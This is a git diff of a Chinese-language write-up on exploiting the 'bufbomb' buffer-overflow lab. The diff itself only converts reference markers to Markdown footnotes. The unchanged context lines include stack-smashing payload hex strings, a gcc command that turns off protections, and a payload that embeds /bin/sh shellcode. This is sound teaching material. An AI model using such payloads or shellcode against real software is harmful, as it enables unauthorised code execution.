@@ -70,7 +70,7 @@ stored in [my github repo](https://github.com/Tiger1218/SCUCCS/tree/main/C-Progr
 
 程序为32位程序；那么Payload还需要加上0x04个Bytes来填充edp。
 
-最后我们需要将存储的eip指针覆盖为我们想要去的地址，也就是`0x80492e0`，并且使得覆盖完后的栈顶[1]为0xdeadbeef。（注意Linux x64是小端序机器）
+最后我们需要将存储的eip指针覆盖为我们想要去的地址，也就是`0x80492e0`，并且使得覆盖完后的栈顶[^1]为0xdeadbeef。（注意Linux x64是小端序机器）
 
 这是一种Payload：`00000000 00000000 00000000 00000000 00000000 00000000 00000000 E0920408 EFBEADDE`
 
@@ -81,7 +81,7 @@ stored in [my github repo](https://github.com/Tiger1218/SCUCCS/tree/main/C-Progr
 * guard: no PIE, no Canary
 
 
-另外一个非常容易想到的思路和`ret2libc`[2]非常像。
+另外一个非常容易想到的思路和`ret2libc`[^2]非常像。
 
 我们完全可以不使用`0x080492e7`处的`printf`————我们可以自己构造一个出来！
 
@@ -110,7 +110,7 @@ payload: `00000000 00000000 00000000 00000000 00000000 00000000 00000000 5090040
 * compile command: `gcc -m32 bufbomb.c -o bufbomb-no-nx -g -no-pie -fno-stack-protector -O0 -z execstack`
 * guard: no PIE, no Canary, no NX, no ASLR
 
-接下来我们来讨论在关闭`NX`保护和关闭`ASLR`保护的利用情况。[3]
+接下来我们来讨论在关闭`NX`保护和关闭`ASLR`保护的利用情况。[^3]
 
 我们可以回顾一下程序的各个section基本情况：
 
@@ -205,7 +205,7 @@ ret ; or you can simply jmp :)
    0x80492e6  <test+56>      push   eax
 ```
 
-当跳转到0x80492d7后，这一切就像无事发生，只不过返回值，也就是`eax`会被改成0xdeadbeef。[4]
+当跳转到0x80492d7后，这一切就像无事发生，只不过返回值，也就是`eax`会被改成0xdeadbeef。[^4]
 
 ```assembly
 push 0xdeadbeef
@@ -252,7 +252,7 @@ ret
 
 ``` padding + ebp + shellcode's start addr + shellcode```
 
-在网上找一个小一点的Shellcode[5]，我们就得到了我们最终的Payload：
+在网上找一个小一点的Shellcode[^5]，我们就得到了我们最终的Payload：
 
 `00000000 00000000 00000000 00000000 00000000 00000000 EBP START_ADDR 31C9F7E1 B00B5168 2F2F7368 682F6269 6E89E3CD 80`
 
@@ -277,8 +277,12 @@ getbuf returned 0xdeadbeef
 
 ## References
 
-[1]: 基本的[C语言函数调用栈](https://www.cnblogs.com/clover-toeic/p/3755401.html)知识可以看这篇文章。
-[2]: 在CTF-Wiki上简述了[ret2libc](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc)的原理和利用方法。
-[3]: [How to turn off gcc compiler optimization to enable buffer overflow? - stackoverflow](https://stackoverflow.com/questions/2340259/how-to-turn-off-gcc-compiler-optimization-to-enable-buffer-overflow)
-[4]: 我们可以使用[PWNTools中的ASM模块](https://docs.pwntools.com/en/stable/asm.html)来将汇编代码编译成字节码。
-[5]: 利用`int 0x80`执行了`/bin/sh`的一段[Shellcode](https://shell-storm.org/shellcode/files/shellcode-841.html)
+[^1]: 基本的[C语言函数调用栈](https://www.cnblogs.com/clover-toeic/p/3755401.html)知识可以看这篇文章。
+
+[^2]: 在CTF-Wiki上简述了[ret2libc](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc)的原理和利用方法。
+
+[^3]: [How to turn off gcc compiler optimization to enable buffer overflow? - stackoverflow](https://stackoverflow.com/questions/2340259/how-to-turn-off-gcc-compiler-optimization-to-enable-buffer-overflow)
+
+[^4]: 我们可以使用[PWNTools中的ASM模块](https://docs.pwntools.com/en/stable/asm.html)来将汇编代码编译成字节码。
+
+[^5]: 利用`int 0x80`执行了`/bin/sh`的一段[Shellcode](https://shell-storm.org/shellcode/files/shellcode-841.html)
